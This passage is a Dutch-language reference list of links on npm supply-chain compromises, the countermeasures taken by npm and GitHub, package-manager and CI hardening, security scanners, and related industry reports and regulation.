- TanStack: [postmortem van TanStack](https://tanstack.com/blog/npm-supply-chain-compromise-postmortem) · [StepSecurity](https://www.stepsecurity.io/blog/mini-shai-hulud-is-back-a-self-spreading-supply-chain-attack-hits-the-npm-ecosystem) · [Unit 42](https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/)
- Mastra: [Microsoft Security](https://www.microsoft.com/en-us/security/blog/2026/06/17/postinstall-payload-inside-mastra-npm-supply-chain-compromise/)
- ChainDrop: [Aikido](https://www.aikido.dev/blog/keyv-and-friends-compromised-in-npm-supply-chain-attack) · [Elastic Security Labs](https://www.elastic.co/security-labs/threat-command/shai-hulud-chaindrop-npm-supply-chain)
- SANDWORM\_MODE: [Socket](https://socket.dev/blog/sandworm-mode-npm-worm-ai-toolchain-poisoning)
- Phantom Gyp: [Snyk](https://snyk.io/blog/node-gyp-supply-chain-compromise-self-propagating-npm-worm-binding-gyp/)
- @joyfill: [StepSecurity](https://www.stepsecurity.io/blog/joyfill-npm-supply-chain-compromise)
- tensorlake: [StepSecurity](https://www.stepsecurity.io/blog/tensorlake-npm-compromised-hostage-token-worm)
- SlugFest: [WorkOS](https://workos.com/blog/npm-trusted-publishing-slugfest)
- Slopsquatting en react-codeshift: [Aikido](https://www.aikido.dev/blog/slopsquatting-ai-package-hallucination-attacks)

### Maatregelen en tools

- npm-beleid: [GitHub, "Our plan for a more secure npm supply chain"](https://github.blog/security/supply-chain-security/our-plan-for-a-more-secure-npm-supply-chain/) · [klassieke tokens ingetrokken (december 2025)](https://github.blog/changelog/2025-12-09-npm-classic-tokens-revoked-session-based-auth-and-cli-token-management-now-available/) · [beperking van bypass-2FA-tokens (juli 2026)](https://github.blog/changelog/2026-07-31-restricting-npm-bypass-2fa-granular-access-tokens)
- npm 12: [release-notes v12.0.0](https://github.com/npm/cli/releases/tag/v12.0.0) · [aankondiging install-time security](https://github.blog/changelog/2026-07-08-npm-install-time-security-and-gat-bypass2fa-deprecation/) · [documentatie npm install-scripts](https://docs.npmjs.com/cli/v12/commands/npm-install-scripts) · [configuratie](https://docs.npmjs.com/cli/v12/using-npm/config) · [scripts](https://docs.npmjs.com/cli/v12/using-npm/scripts)
- Lockfile en npm ci: [package-lock.json](https://docs.npmjs.com/cli/v11/configuring-npm/package-lock-json) · [npm ci](https://docs.npmjs.com/cli/v11/commands/npm-ci) · [Liran Tal over lockfile injection](https://snyk.io/blog/why-npm-lockfiles-can-be-a-security-blindspot-for-injecting-malicious-modules/)
- Trusted publishing en provenance: [trusted publishing GA](https://github.blog/changelog/2025-07-31-npm-trusted-publishing-with-oidc-is-generally-available/) · [documentatie trusted publishers](https://docs.npmjs.com/trusted-publishers) · [introductie van provenance](https://github.blog/security/supply-chain-security/introducing-npm-package-provenance/) · [provenance genereren](https://docs.npmjs.com/generating-provenance-statements) · [staged publishing](https://github.blog/changelog/2026-05-22-staged-publishing-and-new-install-time-controls-for-npm) · [malwarescan bij publicatie](https://github.blog/changelog/2026-07-28-npm-publish-time-malware-scanning-and-dual-use-metadata/)
- Andere package managers: [pnpm 11](https://pnpm.io/blog/releases/11.0) · [pnpm supply-chain security](https://pnpm.io/supply-chain-security) · [Yarn-configuratie](https://yarnpkg.com/configuration/yarnrc) · [Bun lifecycle scripts](https://bun.com/docs/pm/lifecycle) · [Bun 1.3](https://bun.com/blog/bun-v1.3)
- Updatebots: [Dependabot-cooldown als standaard](https://github.blog/changelog/2026-07-14-dependabot-version-updates-introduce-default-package-cooldown/) · [Renovate minimumReleaseAge](https://docs.renovatebot.com/key-concepts/minimum-release-age/)
- GitHub Actions: [secure use reference](https://docs.github.com/en/actions/reference/security/secure-use) · [GitHub over aanvallen op npm en Actions](https://github.blog/security/supply-chain-security/disrupting-supply-chain-attacks-on-npm-and-github-actions/) · [workflow-lockfiles](https://github.blog/changelog/2026-10-14-github-actions-workflow-lockfiles-in-public-preview/) · [zizmor](https://docs.zizmor.sh/audits/) · [Harden-Runner](https://github.com/step-security/harden-runner)
- Scanners: [Socket](https://docs.socket.dev/docs/introduction) · [Aikido Safe Chain](https://github.com/AikidoSec/safe-chain) · [OSV-Scanner](https://google.github.io/osv-scanner/) · [Dependabot-malwarealerts](https://github.blog/changelog/2026-03-17-dependabot-now-detects-malware-in-npm-dependencies/)
- Isolatie: [Node.js-permissiemodel](https://nodejs.org/api/permissions.html) · [LavaMoat](https://github.com/LavaMoat/LavaMoat) · [Deno security](https://docs.deno.com/runtime/fundamentals/security/)
- Raamwerken en formaten: [SLSA-specificatie](https://slsa.dev/spec/) · [OpenSSF Scorecard](https://scorecard.dev/) · [deps.dev](https://docs.deps.dev/) · [CycloneDX](https://cyclonedx.org/specification/overview/) · [SPDX](https://spdx.dev/use/specifications/) · [npm sbom](https://docs.npmjs.com/cli/v12/commands/npm-sbom)

### Rapporten, cijfers en regelgeving

- [Sonatype, State of the Software Supply Chain 2026: open-source malware](https://www.sonatype.com/state-of-the-software-supply-chain/2026/open-source-malware) · [Sonatype 2024](https://www.sonatype.com/en/press-releases/sonatypes-10th-annual-state-of-the-software-supply-chain-report)
- [Zimmermann e.a., "Small World with High Risks", USENIX Security 2019](https://www.usenix.org/system/files/sec19-zimmermann.pdf)
- [Black Duck, OSSRA-rapport](https://www.blackduck.com/blog/open-source-security-risk-analysis.html)
- Cyber Resilience Act: [Europese Commissie](https://digital-strategy.ec.europa.eu/en/policies/cyber-resilience-act) · [samenvatting](https://digital-strategy.ec.europa.eu/en/policies/cra-summary) · [open source en de CRA](https://digital-strategy.ec.europa.eu/en/policies/cra-open-source)
- [Executive Order 14028 (VS, mei 2021)](https://bidenwhitehouse.archives.gov/briefing-room/presidential-actions/2021/05/12/executive-order-on-improving-the-nations-cybersecurity/)
